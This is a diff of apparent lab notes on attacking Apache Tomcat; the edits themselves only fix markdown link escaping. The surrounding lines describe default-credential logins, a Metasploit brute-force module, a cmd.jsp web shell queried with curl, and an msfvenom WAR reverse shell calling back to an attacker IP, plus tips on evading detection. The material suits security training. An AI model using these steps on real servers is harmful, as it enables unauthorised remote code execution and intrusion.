@@ -64,7 +64,7 @@ webapps/customapp
 * These classes might contain important business logic as well as sensitive information
 * Any vulnerability in these files can lead to total compromise of the website.
 * The `lib` folder stores the libraries needed by that particular application.
-* The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta\_Server\_Pages), formerly known as `JavaServer Pages`, which can be compared to PHP files on an Apache server.
+* The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), formerly known as `JavaServer Pages`, which can be compared to PHP files on an Apache server.
 * Here’s an example web.xml file.
 
 ```xml
@@ -148,7 +148,7 @@ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/w
 
 * We may be able to either log in to one of these using weak credentials such as `tomcat:tomcat`, `admin:admin`, etc
 * If these first few tries don't work, we can try a password brute force attack against the login page, covered in the next section.
-* If we are successful in logging in, we can upload a [Web Application Resource or Web Application ARchive (WAR)](https://en.wikipedia.org/wiki/WAR\_\(file\_format\)) file containing a JSP web shell and obtain remote code execution on the Tomcat server.
+* If we are successful in logging in, we can upload a [Web Application Resource or Web Application ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_\(file_format\)) file containing a JSP web shell and obtain remote code execution on the Tomcat server.
 
 ### Attacking Tomcat
 
@@ -156,7 +156,7 @@ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/w
 
 #### Tomcat Manager - Login Brute Force
 
-* We can use the [auxiliary/scanner/http/tomcat\_mgr\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat\_mgr\_login/)
+* We can use the [auxiliary/scanner/http/tomcat\_mgr\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/)
 
 ```
 set VHOST web01.inlanefreight.local
@@ -306,7 +306,7 @@ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
 **Using Metasploit**
 
 * We could also use `msfvenom` to generate a malicious WAR file.
-* The payload [java/jsp\_shell\_reverse\_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp\_shell\_reverse\_tcp.rb) will execute a reverse shell through a JSP file.
+* The payload [java/jsp\_shell\_reverse\_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file.
 * Browse to the Tomcat console and deploy this file.
 * Tomcat automatically extracts the WAR file contents and deploys it.
 
@@ -320,7 +320,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > bac
 nc -lnvp 4443
 ```
 
-* The [multi/http/tomcat\_mgr\_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat\_mgr\_upload/) Metasploit module can be used to automate the process shown above
+* The [multi/http/tomcat\_mgr\_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process shown above
 
 #### cmd.jsp
 
@@ -328,4 +328,4 @@ nc -lnvp 4443
 * Without it, browsing to an uploaded `cmd.jsp` would render nothing.
 * This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).
 
-\
+<br>
